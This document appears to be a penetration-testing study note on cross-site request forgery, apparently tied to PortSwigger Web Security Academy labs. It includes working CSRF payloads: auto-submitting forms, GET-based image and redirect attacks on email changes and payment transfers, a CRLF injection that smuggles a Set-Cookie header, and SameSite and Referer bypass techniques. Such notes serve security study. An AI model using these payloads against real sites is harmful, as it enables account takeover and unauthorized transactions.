# CSRF
CSRF is an attack when attacker induces user to perform some actions on site that they didn't want to do.  
```
<html>
    <body>
        <form action="https://vulnerable-website.com/email/change" method="POST">
            <input type="hidden" name="email" value="pwned@evil-user.net" />
        </form>
        <script>
            document.forms[0].submit();
        </script>
    </body>
</html>
```
This html page will force user to change email  
Easiest way to construct CSRF page is to use CSRF PoC from engagement tools  
If it's possible to perform CSRF via GET request, we can use smth like this:
```
<img src="https://vulnerable-website.com/email/change?email=pwned@evil-user.net">
```
## Bypassing CSRF token validation  
Switch POST to GET  
Some applications  correctly validate the token when it is present but skip the validation if the token is omitted.  
In this situation, the attacker can remove the entire parameter containing the token (not just its value) to bypass the validation and deliver a CSRF attack
Some applications do not validate that the token belongs to the same session as the user who is making the request. Instead, the application maintains a globalpool of tokens that it has issued and accepts any token that appears in this pool.  
In this situation, the attacker can log in to the application using their own account, obtain a valid token, and then feed that token to the victim user in their CSRF attack.   
Remember that tokens could be single-use  

CSRF token could be duplicated in Cookie. In such case, we need to exploit cookie-setting mechanism and force user to use our own generated CSRF token which must be same with token in cookie.  
For example, if server duplicates our search requests in cookie like `lastSearch: test`, we can create search request which will set our own cookie and csrf token and send such request to user and then exploit CSRF  
Example:
```
/search?q=test%0d%0aSet-Cookie:csrf=fake%3b%20SameSite=None
```
%0d%0a - new line  
%3b - ;  
Then we create CSRF PoC and add 
```
<img src="https://0a4a000404f41823808649ee00a4001f.web-security-academy.net/search?test%0d%0aSet-Cookie:csrf=fake%3b%20SameSite=None" onerror="document.forms[0].submit();"/>
```
## Bypassing SameSite cookie restrictions
SameSite checks URL scheme and TLD+1. That means, that it checks http/https and `.com` and one level behind that.  
Same-Origin checks the whole origin including port and all subdomain names.  
So same-site allows requests from `https://app.example.com` to `https://intranet.example.com` and from `https://example.com` to `https://example.com:8080`, while same-origin will strictly check all the things  
If site don't issue SameSite, Chrome will always set ot to `Lax` value  
### Strict
If a cookie is set with the SameSite=Strict attribute, browsers will not send it in any cross-site requests. In simple terms, this means that if the target site for the request does not match the site currently shown in the browser's address bar, it will not include the cookie.  
### Lax
Lax will send cookies in cross-site requests, but only if it `GET` requests and request was resulted from top-level navigation by user (clicking a link)  
### None
SameSite is disabled  
This behaviour is acceptable only if cookie is third-party and not used to manipulate any sensitive data.  
## Bypassing Lax restrictions with GET requests
We can simply change POST to GET and create XSS vector with top-level navigation (link):
```
<script>
    document.location = 'https://vulnerable-website.com/account/transfer-payment?recipient=hacker&amount=1000000';
</script>
```
If we can't use simple GET requests, we can try to epxloit some framework features. In case of `Symphony`, we can use `_method` parameters in form to override request method:
```
<form action="https://vulnerable-website.com/account/transfer-payment" method="POST">
    <input type="hidden" name="_method" value="GET">
    <input type="hidden" name="recipient" value="hacker">
    <input type="hidden" name="amount" value="1000000">
</form>
```
## Bypassing using on-site gadgets
If cookies are using `SameSite=Strict`, we can't use them in any cross-site requests. But we can try to bypass it using site gadgets with secondary requests.  
One possible gadget is client-side redirect which uses attacker-controllable input such as URL to construct redirection target.  
Note that the equivalent attack is not possible with server-side redirects  

SameSite cookie restrictions are omitted for 120 seconds during OAuth login, so we can exploit this:
```
<form method="POST" action="https://0a6500bc0453f13481cb5f6c002c00c9.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="pwned@portswigger.net">
</form>
<p>Click anywhere on the page</p>
<script>
    window.onclick = () => {
        window.open('https://0a6500bc0453f13481cb5f6c002c00c9.web-security-academy.net/social-login');
        setTimeout(changeEmail, 5000);
    }

    function changeEmail() {
        document.forms[0].submit();
    }
</script>
```
## Bypassing Referer-based CSRF defenses
Referer header is set by servers to identify page from which request is created  
First way is just simply omit Referer header.  
In this situation, an attacker can craft their CSRF exploit in a way that causes the victim user's browser to drop the Referer header in the resulting request. There are various ways to achieve this, but the easiest is using a META tag within the HTML page that hosts the CSRF attack:  
```
<meta name="referrer" content="never">
or
<meta name="referrer" content="no-referrer">
```
Another way is bypassing inadequate validating of Referer header. We can set vulnerable website as subdomain of our exploit server or as parameter in URL:
```
http://vulnerable-website.com.attacker-website.com/csrf-attack
http://attacker-website.com/csrf-attack?vulnerable-website.com
```
It's important to detect `Referrer-Policy: unsafe-url` header in response. This ensures that the full URL will be sent, including the query string.  

